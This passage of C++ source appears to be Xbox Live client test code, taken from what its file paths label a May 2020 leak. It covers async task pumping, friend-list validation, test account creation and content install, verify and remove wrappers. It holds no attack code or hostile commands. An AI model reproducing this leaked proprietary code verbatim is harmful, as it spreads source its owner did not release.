                xLog(hLog, XLL_FAIL, "Pumping hEnumGamesTask returned %0x and failed unexpectedly for user %d",hrContinue, dwUserIndex);
                bTestResult = FALSE;
	            *phrReturn = hrContinue;
	            return SY_STOPTESTCASE;
            }
        }

    	if(hLockoutTask)
    	{
	        HRESULT hrContinue = XOnlineTaskContinue(hLockoutTask);
	        	
	        if(XONLINETASK_S_RUNNING != hrContinue)
	        {
	            xLog(hLog, XLL_FAIL, "Pumping hLockoutTask returned %0x and failed unexpectedly", hrContinue); 
	            bTestResult = FALSE;
	            *phrReturn = hrContinue;
	            return SY_STOPTESTCASE;
	        }
    	}
        
	    if(SY_STOPWHOLETEST == PumpLogonTask(hLog, hLogonTask, phrReturn))
	    {
            return SY_STOPWHOLETEST;
		}
			
        Sleep(SLEEPTIME);
    }

    if(SY_STOPWHOLETEST == PumpLogonTask(hLog, hLogonTask, phrReturn))
    {
        *phrReturn = hReturn;
        return SY_STOPWHOLETEST;
	}
    
    return SY_SUCCESS;	
}

//==================================================================================
// PumpLogonTask
//----------------------------------------------------------------------------------
//
// Description: Pump Logon Task periodically
//
// Arguments:
//	HANDLE  hLog, XONLINETASK_HANDLE hLogonTask
// Returns:
//	E_FAIL if pumping fails and it will block whole test case after now.
//==================================================================================

SY_RESULT PumpLogonTask(HANDLE  hLog, XONLINETASK_HANDLE hLogonTask, HRESULT* phrReturn)
{
	*phrReturn = XOnlineTaskContinue(hLogonTask); 

	if(FAILED(*phrReturn)) 
	{
	    xLog(hLog, XLL_FAIL, "Pumping Logon Task returned %0x and Lost connection with CS, exiting test!",*phrReturn);
        return SY_STOPWHOLETEST;
	}

	return SY_SUCCESS;
}

//==================================================================================
// IsLockoutUser
//----------------------------------------------------------------------------------
//
// Description: Check if specified user is locked out
//
// Arguments:
//	DWORD dwNumLockoutUsers, PXONLINE_LOCKOUTUSER  pLockoutlist, XUID xuid
// Returns:
//	TURE if the specified user is locked out.
//==================================================================================

BOOL IsLockoutUser(DWORD dwNumLockoutUsers, PXONLINE_LOCKOUTUSER  pLockoutlist, XUID xuid)
{
	for(DWORD ii=0; ii<dwNumLockoutUsers; ii++)
	{
		if(pLockoutlist[ii].xuid.qwUserID == xuid.qwUserID)
			return TRUE;
	}

	return FALSE;
	
}
//==================================================================================
// IsValidResultForFriendList
//----------------------------------------------------------------------------------
//
// Description: Check if it is valid result for Friend List
//
// Arguments:
//	HANDLE  hLog, DWORD dwNumOfExpectedFriend, DWORD dwNumOfReturnedFriend, 
//	XONLINE_FRIEND *pFriendListExpected, XONLINE_FRIEND *pFriendListReturned
// Returns:
//	TURE if valid result
//==================================================================================

BOOL	IsValidResultForFriendList(HANDLE  hLog, DWORD dwNumOfExpectedFriend, DWORD dwNumOfReturnedFriend, 
										XONLINE_FRIEND *pFriendListExpected, XONLINE_FRIEND *pFriendListReturned)
{
	BOOL	bExpectedResult;
	
	if(dwNumOfExpectedFriend != dwNumOfReturnedFriend){
		return FALSE;
	}

	for(UINT ii = 0; ii < dwNumOfReturnedFriend; ++ii)
	{
		for(UINT jj = 0; jj < dwNumOfExpectedFriend; ++jj)
		{
			if(pFriendListReturned[ii].xuid.qwUserID == pFriendListExpected[jj].xuid.qwUserID)
			{
				if(strncmp(pFriendListReturned[ii].username, pFriendListExpected[jj].username, strlen(pFriendListExpected[jj].username)))
					return FALSE;
				else
					break;
			}
		}

		if(jj == dwNumOfExpectedFriend)
		{
			bExpectedResult = FALSE;
			return FALSE;
		}
			
		if(pFriendListReturned[ii].friendState != pFriendListExpected[jj].friendState)
		{
			bExpectedResult = FALSE;
			return FALSE;
		}

		if(*((ULONGLONG *) &(pFriendListReturned[ii].sessionID)) != *((ULONGLONG *) &(pFriendListExpected[jj].sessionID)) ||
			pFriendListReturned[ii].titleID != pFriendListExpected[jj].titleID ||
			pFriendListReturned[ii].StateDataSize != pFriendListExpected[jj].StateDataSize )
		{
			bExpectedResult = FALSE;
			return FALSE;
		}

		if( pFriendListExpected[ii].StateDataSize != 0 )
			if( memcmp(pFriendListReturned[ii].StateData, pFriendListExpected[jj].StateData, pFriendListExpected[jj].StateDataSize))
			{
				bExpectedResult = FALSE;
				return FALSE;
			}
				
	}

	return TRUE;
}


#if SY_NEED_CREATE_USERS

//==================================================================================
// SY_CreateUserAccounts
//----------------------------------------------------------------------------------
//
// Description: 
//
// Arguments:
//	DWORD dwNumAccounts				the number of accounts to create
//											
//
// Returns: 
//==================================================================================

HRESULT 
SY_CreateUserAccounts(DWORD dwNumAccounts )
{
	HRESULT		hr = S_OK, hrTask;
	HANDLE hEvent = NULL;
	XONLINETASK_HANDLE hTask = NULL;

	XONLINEP_USER pUsers[XONLINE_MAX_LOGON_USERS];

	__try
	{
		hEvent = CreateEvent( NULL, FALSE, FALSE, NULL );

		ASSERT(hEvent);
		if ( NULL == hEvent )
		{
			hr = E_OUTOFMEMORY;
			RaiseException(0xe0000001, 0,0, NULL);
		}
		
//		pUsers = (PXONLINEP_USER) LocalAlloc(LPTR, sizeof(PXONLINEP_USER) * dwNumAccounts);

		strcpy(pUsers[0].name,"Steve650122");
		strcpy(pUsers[1].name,"Kay660125");
		strcpy(pUsers[2].name,"Chanyoung940327");
		strcpy(pUsers[3].name,"Chris990607");

		for( DWORD ii=0; ii<dwNumAccounts; ii++ )
		{
			strcpy(pUsers[ii].kingdom,"Earth");

			hr = _XOnlineAccountTempCreate( (PXONLINE_USER) &pUsers[ii], hEvent, &hTask );

			ASSERT( SUCCEEDED( hr ) );
			if(FAILED(hr))
			{
				hr = E_FAIL;
				RaiseException(0xe0000001, 0,0, NULL);
			}


			do
			{   
				//
				// wait for data to be ready for processing
				//

				DWORD dwWait = WaitForSingleObject( hEvent, INFINITE );

				ASSERT(WAIT_FAILED != dwWait);
				if ( WAIT_FAILED == dwWait )
				{
					hr = E_OUTOFMEMORY;
					RaiseException(0xe0000001, 0,0, NULL);
				}
    
				//
				// continue pumping the handle
				//

				hrTask = XOnlineTaskContinue( hTask);

			} while ( hrTask == XONLINETASK_S_RUNNING );

			ASSERT( SUCCEEDED( hrTask ) );
			if(FAILED(hrTask))
			{
				hr = E_FAIL;
				RaiseException(0xe0000001, 0,0, NULL);
			}
			
			XOnlineTaskClose( hTask );

		}

	}
	__except((GetExceptionCode() == 0xe0000001)?
				EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH )
	{
	}

	return hr;
}
#endif

#if 0
//==================================================================================
// PollTaskUntilGetResult
//----------------------------------------------------------------------------------
//
// Description: Calls the XOnlineTaskComplete function until either the given
//    task has been completed or the amount of available time has expired
//
// Arguments:
//	XONLINETASK_HANDLE	hTask				Handle to async task
//	HANDLE				hEvent		Event that is associated with this async task.
//											This can be set to NULL or INVALID_HANDLE_VALUE
//											if no event is associated with the task
//	DWORD				dwMaxWaitTime		Maximum amount of time to wait for the task to
//											complete. This can be set to INFINITE to block
//											until completion
//	DWORD				*pdwPollCounter		Optional counter passed in to keep track of the
//											number of calls made to the XOnlineTaskContinue function
//	BOOL				*pfCompleted		Optional boolean passed in to keep track if whether
//											the task completed or not
//  BOOL				fCloseOnComplete	Indicates whether the function should close a handle
//											after it indicates completion
//
// Returns: The last result code from XOnlineTaskContinue is returned.  If a valid pointer
//   is provided for pfCompleted, it is updated to reflect whether the task has completed or not
//==================================================================================
HRESULT PollTaskUntilGetResult(XONLINETASK_HANDLE hTask, HANDLE hEvent, DWORD dwMaxWaitTime, DWORD *pdwPollCounter, BOOL *pfCompleted, BOOL fCloseOnComplete)
{
	HRESULT hr = S_OK;
	DWORD dwLastTime = 0, dwCurrentTime = 0, dwCurrentDuration = 0, dwWaitTimeLeft = dwMaxWaitTime;
	DWORD dwInternalPollCounter = 0;
	HRESULT hrContinue;

	if(pfCompleted)
		*pfCompleted = FALSE;

	dwLastTime = GetTickCount();

	do
	{
		if((hEvent != INVALID_HANDLE_VALUE) && (hEvent != NULL))
			WaitForSingleObject(hEvent, dwWaitTimeLeft);

		hrContinue = XOnlineTaskContinue(hTask);

		// Update the poll-counter
		++dwInternalPollCounter;

		if (XONLINETASK_S_RUNNING != hrContinue)	//if hrDoWorks is not XONLINETASK_S_RUNNING(0x0)
		{	
		 	if (XONLINETASK_S_SUCCESS == hrContinue)	//if hrDoWorks is XONLINETASK_S_SUCCESS(0x1)
			{
				if(pfCompleted)
				{
					*pfCompleted = TRUE;
				}
			}
		  	else if (FAILED(hTask))
		    	{
		        	hr = hrContinue;
		    	}

			if(fCloseOnComplete)
			{
				XOnlineTaskClose(hTask);
			}	
		    	
		    break;
		}		

		if(dwMaxWaitTime != INFINITE)
		{
			// See if we have gone beyond the maximum allowed time
			dwCurrentTime = GetTickCount();
			if(dwCurrentTime < dwLastTime)
			{
				dwCurrentDuration = ((MAXDWORD - dwLastTime) + dwCurrentTime);
			}
			else
			{
				dwCurrentDuration = (dwCurrentTime - dwLastTime);
			}
			
			if(dwCurrentDuration >= dwWaitTimeLeft)
			{
				DbgPrint("Async operation didn't complete within %u ms\n", dwMaxWaitTime);
				hr = E_FAIL;
				goto Exit;
			}
			
			dwWaitTimeLeft -= dwCurrentDuration;
			dwLastTime = dwCurrentTime;
		}
	} while(TRUE);

Exit:
	if(pdwPollCounter)
		*pdwPollCounter = dwInternalPollCounter;

	return hr;
}

#endif
//==================================================================================
// XBudBVTEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI XBudBVTEndTest()
{

}

} // namespace XBudTestNamespace

// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XBudBVT )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( XBudBVT )
    EXPORT_TABLE_ENTRY( "StartTest", XBudBVTStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XBudBVTEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", XBudBVTDllMain )
END_EXPORT_TABLE( XBudBVT )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\AsyncTask.cpp ===
// AsyncTask.cpp: implementation of the CAsyncTask class.
//
//////////////////////////////////////////////////////////////////////

#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>
#include "AsyncTask.h"

HRESULT WaitAndPump(DWORD dwWorkUntil, CAsyncTask *pTask)
{
	HRESULT hr = S_OK;

	if(pTask->WaitForWork(0))
		hr = pTask->TaskContinue();

	return hr;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAsyncTask::CAsyncTask()
{
	m_hLog = NULL;
	m_hrLastResult = S_OK;
	m_hTask = NULL;
	m_hWorkEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
}

CAsyncTask::~CAsyncTask()
{
	m_hTask ? XOnlineTaskClose(m_hTask) : 0;
	m_hWorkEvent ? CloseHandle(m_hWorkEvent) : 0;
}

void CAsyncTask::RegisterLogHandle(HANDLE hLog)
{
	m_hLog = hLog;
}

char * CAsyncTask::GetTaskErrorString(HRESULT hr)
{
	switch(hr)
	{
	case XONLINE_E_OVERFLOW:
		return "XONLINE_E_OVERFLOW";
	case XONLINE_E_NO_SESSION:
		return "XONLINE_E_NO_SESSION";
	case XONLINE_E_USER_NOT_LOGGED_ON:
		return "XONLINE_E_USER_NOT_LOGGED_ON";
	case XONLINE_E_NO_GUEST_ACCESS:
		return "XONLINE_E_NO_GUEST_ACCESS";
	case XONLINE_E_NOT_INITIALIZED:
		return "XONLINE_E_NOT_INITIALIZED";
	case XONLINE_E_NO_USER:
		return "XONLINE_E_NO_USER";
	case XONLINE_E_INTERNAL_ERROR:
		return "XONLINE_E_INTERNAL_ERROR";
	case XONLINE_S_LOGON_CONNECTION_ESTABLISHED:
		return "XONLINE_S_LOGON_CONNECTION_ESTABLISHED";
	case XONLINE_E_LOGON_SERVICE_UNAVAILABLE:
		return "XONLINE_E_LOGON_SERVICE_UNAVAILABLE";
	case XONLINE_E_LOGON_CONNECTION_LOST:
		return "XONLINE_E_LOGON_CONNECTION_LOST";
	case XONLINE_E_LOGON_UPDATE_REQUIRED:
		return "XONLINE_E_LOGON_UPDATE_REQUIRED";
	case XONLINE_E_LOGON_XBOX_ACCOUNT_INVALID:
		return "XONLINE_E_LOGON_XBOX_ACCOUNT_INVALID";
	case XONLINE_E_LOGON_USER_ACCOUNT_INVALID:
		return "XONLINE_E_LOGON_USER_ACCOUNT_INVALID";
	case XONLINE_E_LOGON_NO_SUBSCRIPTION:
		return "XONLINE_E_LOGON_NO_SUBSCRIPTION";
	case XONLINE_E_LOGON_MU_NOT_MOUNTED:
		return "XONLINE_E_LOGON_MU_NOT_MOUNTED";
	case XONLINE_E_LOGON_MU_IO_ERROR:
		return "XONLINE_E_LOGON_MU_IO_ERROR";
	case XONLINE_E_LOGON_NOT_LOGGED_ON:
		return "XONLINE_E_LOGON_NOT_LOGGED_ON";
	case XONLINE_E_LOGON_SERVICE_NOT_REQUESTED:
		return "XONLINE_E_LOGON_SERVICE_NOT_REQUESTED";
	case XONLINE_E_LOGON_SERVICE_NOT_AUTHORIZED:
		return "XONLINE_E_LOGON_SERVICE_NOT_AUTHORIZED";
	case XONLINE_S_NOTIFICATION_UPTODATE:
		return "XONLINE_S_NOTIFICATION_UPTODATE";
	case XONLINE_E_NOTIFICATION_BAD_CONTENT_TYPE:
		return "XONLINE_E_NOTIFICATION_BAD_CONTENT_TYPE";
	case XONLINE_E_NOTIFICATION_REQUEST_TOO_SMALL:
		return "XONLINE_E_NOTIFICATION_REQUEST_TOO_SMALL";
	case XONLINE_E_NOTIFICATION_INVALID_MESSAGE_TYPE:
		return "XONLINE_E_NOTIFICATION_INVALID_MESSAGE_TYPE";
	case XONLINE_E_NOTIFICATION_NO_ADDRESS:
		return "XONLINE_E_NOTIFICATION_NO_ADDRESS";
	case XONLINE_E_NOTIFICATION_INVALID_PUID:
		return "XONLINE_E_NOTIFICATION_INVALID_PUID";
	case XONLINE_E_NOTIFICATION_NO_CONNECTION:
		return "XONLINE_E_NOTIFICATION_NO_CONNECTION";
	case XONLINE_E_NOTIFICATION_SEND_FAILED:
		return "XONLINE_E_NOTIFICATION_SEND_FAILED";
	case XONLINE_E_NOTIFICATION_RECV_FAILED:
		return "XONLINE_E_NOTIFICATION_RECV_FAILED";
	case XONLINE_E_NOTIFICATION_MESSAGE_TRUNCATED:
		return "XONLINE_E_NOTIFICATION_MESSAGE_TRUNCATED";
	case XONLINE_E_NOTIFICATION_SERVER_BUSY:
		return "XONLINE_E_NOTIFICATION_SERVER_BUSY";
	case XONLINE_E_NOTIFICATION_LIST_FULL:
		return "XONLINE_E_NOTIFICATION_LIST_FULL";
	case XONLINE_E_NOTIFICATION_BLOCKED:
		return "XONLINE_E_NOTIFICATION_BLOCKED";
	case XONLINE_E_NOTIFICATION_FRIEND_PENDING:
		return "XONLINE_E_NOTIFICATION_FRIEND_PENDING";
	case XONLINE_E_NOTIFICATION_FLUSH_TICKETS:
		return "XONLINE_E_NOTIFICATION_FLUSH_TICKETS";
	case XONLINE_E_MATCH_INVALID_SESSION_ID:
		return "XONLINE_E_MATCH_INVALID_SESSION_ID";
	case XONLINE_E_MATCH_INVALID_TITLE_ID:
		return "XONLINE_E_MATCH_INVALID_TITLE_ID";
	case XONLINE_E_MATCH_INVALID_DATA_TYPE:
		return "XONLINE_E_MATCH_INVALID_DATA_TYPE";
	case XONLINE_E_MATCH_REQUEST_TOO_SMALL:
		return "XONLINE_E_MATCH_REQUEST_TOO_SMALL";
	case XONLINE_E_MATCH_REQUEST_TRUNCATED:
		return "XONLINE_E_MATCH_REQUEST_TRUNCATED";
	case XONLINE_E_MATCH_INVALID_SEARCH_REQ:
		return "XONLINE_E_MATCH_INVALID_SEARCH_REQ";
	case XONLINE_E_MATCH_INVALID_OFFSET:
		return "XONLINE_E_MATCH_INVALID_OFFSET";
	case XONLINE_E_MATCH_INVALID_ATTR_TYPE:
		return "XONLINE_E_MATCH_INVALID_ATTR_TYPE";
	case XONLINE_E_MATCH_INVALID_VERSION:
		return "XONLINE_E_MATCH_INVALID_VERSION";
	case XONLINE_E_MATCH_OVERFLOW:
		return "XONLINE_E_MATCH_OVERFLOW";
	case XONLINE_E_MATCH_INVALID_RESULT_COL:
		return "XONLINE_E_MATCH_INVALID_RESULT_COL";
	case XONLINE_E_MATCH_INVALID_STRING:
		return "XONLINE_E_MATCH_INVALID_STRING";
	case XONLINE_E_MATCH_STRING_TOO_LONG:
		return "XONLINE_E_MATCH_STRING_TOO_LONG";
	case XONLINE_E_MATCH_BLOB_TOO_LONG:
		return "XONLINE_E_MATCH_BLOB_TOO_LONG";
	case XONLINE_E_MATCH_PUID_MISMATCH:
		return "XONLINE_E_MATCH_PUID_MISMATCH";
	case XONLINE_E_MATCH_INVALID_PLAYER:
		return "XONLINE_E_MATCH_INVALID_PLAYER";
	case XONLINE_E_MATCH_INVALID_ATTRIBUTE_ID:
		return "XONLINE_E_MATCH_INVALID_ATTRIBUTE_ID";
	case XONLINE_E_MATCH_PLAYER_ALREADY_EXISTS:
		return "XONLINE_E_MATCH_PLAYER_ALREADY_EXISTS";
	case XONLINE_E_MATCH_SESSION_ALREADY_EXISTS:
		return "XONLINE_E_MATCH_SESSION_ALREADY_EXISTS";
	case XONLINE_E_MATCH_NO_TITLES:
		return "XONLINE_E_MATCH_NO_TITLES";
	case XONLINE_E_MATCH_TITLE_ALREADY_EXISTS:
		return "XONLINE_E_MATCH_TITLE_ALREADY_EXISTS";
	case XONLINE_E_MATCH_CRITICAL_DB_ERR:
		return "XONLINE_E_MATCH_CRITICAL_DB_ERR";
	case XONLINE_E_MATCH_NOT_ENOUGH_COLUMNS:
		return "XONLINE_E_MATCH_NOT_ENOUGH_COLUMNS";
	case XONLINE_E_MATCH_PERMISSION_DENIED:
		return "XONLINE_E_MATCH_PERMISSION_DENIED";
	case XONLINE_E_MATCH_INVALID_PART_SCHEME:
		return "XONLINE_E_MATCH_INVALID_PART_SCHEME";
	case XONLINE_E_MATCH_INVALID_PARAM:
		return "XONLINE_E_MATCH_INVALID_PARAM";
	case XONLINE_E_MATCH_USE_SETPLAYER_PROC:
		return "XONLINE_E_MATCH_USE_SETPLAYER_PROC";
	case XONLINE_E_MATCH_PLAYER_REQUIRED:
		return "XONLINE_E_MATCH_PLAYER_REQUIRED";
	case XONLINE_E_MATCH_PLAYER_NOT_NEEDED:
		return "XONLINE_E_MATCH_PLAYER_NOT_NEEDED";
	case XONLINE_E_MATCH_DATA_TYPE_MISMATCH:
		return "XONLINE_E_MATCH_DATA_TYPE_MISMATCH";
	case XONLINE_E_MATCH_SERVER_ERROR:
		return "XONLINE_E_MATCH_SERVER_ERROR";
	case XONLINE_E_MATCH_NO_USERS:
		return "XONLINE_E_MATCH_NO_USERS";
	case XONLINE_E_MATCH_INVALID_BLOB:
		return "XONLINE_E_MATCH_INVALID_BLOB";
	case XONLINE_E_OFFERING_BAD_REQUEST:
		return "XONLINE_E_OFFERING_BAD_REQUEST";
	case XONLINE_E_OFFERING_INVALID_USER:
		return "XONLINE_E_OFFERING_INVALID_USER";
	case XONLINE_E_OFFERING_INVALID_OFFER_ID:
		return "XONLINE_E_OFFERING_INVALID_OFFER_ID";
	case XONLINE_E_OFFERING_INELIGIBLE_FOR_OFFER:
		return "XONLINE_E_OFFERING_INELIGIBLE_FOR_OFFER";
	case XONLINE_E_OFFERING_OFFER_EXPIRED:
		return "XONLINE_E_OFFERING_OFFER_EXPIRED";
	case XONLINE_E_OFFERING_SERVICE_UNREACHABLE:
		return "XONLINE_E_OFFERING_SERVICE_UNREACHABLE";
	case XONLINE_E_OFFERING_PURCHASE_BLOCKED:
		return "XONLINE_E_OFFERING_PURCHASE_BLOCKED";
	case XONLINE_E_OFFERING_PURCHASE_DENIED:
		return "XONLINE_E_OFFERING_PURCHASE_DENIED";
	case XONLINE_E_OFFERING_BILLING_SERVER_ERROR:
		return "XONLINE_E_OFFERING_BILLING_SERVER_ERROR";
	case XONLINE_E_OFFERING_OFFER_NOT_CANCELABLE:
		return "XONLINE_E_OFFERING_OFFER_NOT_CANCELABLE";
	case XONLINE_E_OFFERING_NOTHING_TO_CANCEL:
		return "XONLINE_E_OFFERING_NOTHING_TO_CANCEL";
	case XONLINE_E_OFFERING_PERMISSION_DENIED:
		return "XONLINE_E_OFFERING_PERMISSION_DENIED";
	default:
		return "UNKNOWN";
	}

}

HRESULT CAsyncTask::TaskContinue()
{
	if(m_hTask)
		return m_hrLastResult = XOnlineTaskContinue(m_hTask);

	return E_FAIL;
}

HRESULT CAsyncTask::GetLastResult()
{
	return m_hrLastResult;
}

BOOL CAsyncTask::IsTaskComplete()
{
	return (XONLINETASK_STATUS_AVAILABLE(m_hrLastResult));
}

BOOL CAsyncTask::WaitForWork(DWORD dwUntilTickCount)
{
	if(!m_hWorkEvent)
		return FALSE;

	return (WaitForSingleObject(m_hWorkEvent, dwUntilTickCount) == WAIT_OBJECT_0);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\ContentInstallTask.h ===
// ontentInstallTask.h: interface for the ContentInstallTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class CContentInstallTask : public CAsyncTask  
{
public:
	void SetOfferingID(XONLINEOFFERING_ID OfferingID);
	HRESULT GetProgress(DWORD *pdwPercentDone, ULONGLONG *pqwNumerator, ULONGLONG *pqwDenominator);
	BOOL StartTask();
	CContentInstallTask();
	virtual ~CContentInstallTask();

protected:
	XONLINEOFFERING_ID m_OfferingID;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\ContentRemoveTask.h ===
// ContentRemoveTask.h: interface for the CContentRemoveTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class CContentRemoveTask : public CAsyncTask  
{
public:
	void SetOfferingID(XONLINEOFFERING_ID OfferingID);
	BOOL StartTask();
	CContentRemoveTask();
	virtual ~CContentRemoveTask();

protected:
	XONLINEOFFERING_ID m_OfferingID;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\ContentVerifyTask.h ===
// ContentVerifyTask.h: interface for the CContentVerifyTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class CContentVerifyTask : public CAsyncTask  
{
public:
	void SetOfferingID(XONLINEOFFERING_ID OfferingID);
	BOOL StartTask();
	CContentVerifyTask();
	virtual ~CContentVerifyTask();

protected:
	XONLINEOFFERING_ID m_OfferingID;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\ContentVerifyTask.cpp ===
// ContentVerifyTask.cpp: implementation of the CContentVerifyTask class.
//
//////////////////////////////////////////////////////////////////////

#include "ContentVerifyTask.h"

#define XBOX_HD_SECTOR_SIZE        512

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CContentVerifyTask::CContentVerifyTask()
{
	m_OfferingID = 0;
}

CContentVerifyTask::~CContentVerifyTask()
{

}

BOOL CContentVerifyTask::StartTask()
{
	DWORD dwVerifyBufferSize = XBOX_HD_SECTOR_SIZE * 2;

	// If this object has been used for a previous verification task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}
	
	m_hrLastResult = XOnlineContentVerify(m_OfferingID, NULL, &dwVerifyBufferSize, m_hWorkEvent, &m_hTask);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CContentVerifyTask: XOnlineContentVerify failed", m_hrLastResult);
		return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

void CContentVerifyTask::SetOfferingID(XONLINEOFFERING_ID OfferingID)
{
	m_OfferingID = OfferingID;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\FriendEnumTask.h ===
// FriendEnumTask.h: interface for the CFriendEnumTask class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "AsyncTask.h"

class CFriendEnumTask : public CAsyncTask  
{
public:
	BOOL IsFriendListUpToDate();
	DWORD GetLatestFriendList(XONLINE_FRIEND **ppFriendList);
	HRESULT TaskContinue();
	void SetUserIndex(DWORD dwUserIndex);
	BOOL StartTask();
	CFriendEnumTask();
	virtual ~CFriendEnumTask();

protected:
	DWORD m_dwFriendsCount;
	DWORD m_dwUserIndex;
	XONLINE_FRIEND *m_pFriendArray;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\ContentRemoveTask.cpp ===
// ContentRemoveTask.cpp: implementation of the CContentRemoveTask class.
//
//////////////////////////////////////////////////////////////////////

#include "ContentRemoveTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CContentRemoveTask::CContentRemoveTask()
{
	m_OfferingID = 0;
}

CContentRemoveTask::~CContentRemoveTask()
{

}

BOOL CContentRemoveTask::StartTask()
{
	// If this object has been used for a previous content remove task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}
	
	m_hrLastResult = XOnlineContentRemove(m_OfferingID, m_hWorkEvent, &m_hTask);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CContentRemoveTask: XOnlineContentRemove failed", m_hrLastResult);
		return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

void CContentRemoveTask::SetOfferingID(XONLINEOFFERING_ID OfferingID)
{
	m_OfferingID = OfferingID;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\ContentInstallTask.cpp ===
// ontentInstallTask.cpp: implementation of the ContentInstallTask class.
//
//////////////////////////////////////////////////////////////////////

#include "ContentInstallTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CContentInstallTask::CContentInstallTask()
{
	m_OfferingID = 0;
}

CContentInstallTask::~CContentInstallTask()
{

}

BOOL CContentInstallTask::StartTask()
{
	// If this object has been used for a previous installation task, clean up the old task first
	if(m_hTask)
	{
		XOnlineTaskClose(m_hTask);
		m_hTask = NULL;
	}
	
	m_hrLastResult = XOnlineContentInstall(m_OfferingID, m_hWorkEvent, &m_hTask);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CContentInstallTask: XOnlineContentInstall failed", m_hrLastResult);
		return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

HRESULT CContentInstallTask::GetProgress(DWORD *pdwPercentDone, ULONGLONG *pqwNumerator, ULONGLONG *pqwDenominator)
{
	return XOnlineContentInstallGetProgress(m_hTask, pdwPercentDone, pqwNumerator, pqwDenominator);

}

void CContentInstallTask::SetOfferingID(XONLINEOFFERING_ID OfferingID)
{
	m_OfferingID = OfferingID;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\common\onlinehelper\FriendEnumTask.cpp ===
// FriendEnumTask.cpp: implementation of the CFriendEnumTask class.
//
//////////////////////////////////////////////////////////////////////

#include "FriendEnumTask.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFriendEnumTask::CFriendEnumTask()
{
	m_pFriendArray = new XONLINE_FRIEND[MAX_FRIENDS];
	memset(m_pFriendArray, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);
	m_dwUserIndex = 0;
	m_dwFriendsCount = 0;
}

CFriendEnumTask::~CFriendEnumTask()
{
	delete [] m_pFriendArray;
}

BOOL CFriendEnumTask::StartTask()
{
	HRESULT hr = S_OK;

	// Start enumeration
	m_hrLastResult = XOnlineFriendsEnumerate(m_dwUserIndex, m_hWorkEvent, &m_hTask);
	if(FAILED(m_hrLastResult))
	{
		LOGTASKINFOHR(m_hLog, "CFriendEnumTask: XOnlineFriendsEnumerate failed", m_hrLastResult);
        return FALSE;
	}

	// Mark the task as running so TaskContinue calls will be processed
	m_hrLastResult = XONLINETASK_S_RUNNING;

	return TRUE;
}

void CFriendEnumTask::SetUserIndex(DWORD dwUserIndex)
{
	m_dwUserIndex = dwUserIndex;
}

HRESULT CFriendEnumTask::TaskContinue()
{
	CAsyncTask::TaskContinue();

	// Only get the final result when the task first completes
	if(XONLINETASK_STATUS_AVAILABLE(m_hrLastResult) && (XONLINE_S_NOTIFICATION_UPTODATE != m_hrLastResult))
	{
		LOGTASKINFO(m_hLog, "CFriendEnumTask: XOnlineFriendsEnumerate task failed asynchronously");
	}

	return m_hrLastResult;
}

DWORD CFriendEnumTask::GetLatestFriendList(XONLINE_FRIEND **ppFriendList)
{

	m_dwFriendsCount = XOnlineFriendsGetLatest(m_dwUserIndex, MAX_FRIENDS, m_pFriendArray);

	if(ppFriendList)
		*ppFriendList = m_pFriendArray;

	return m_dwFriendsCount;
}

BOOL CFriendEnumTask::IsFriendListUpToDate()
{
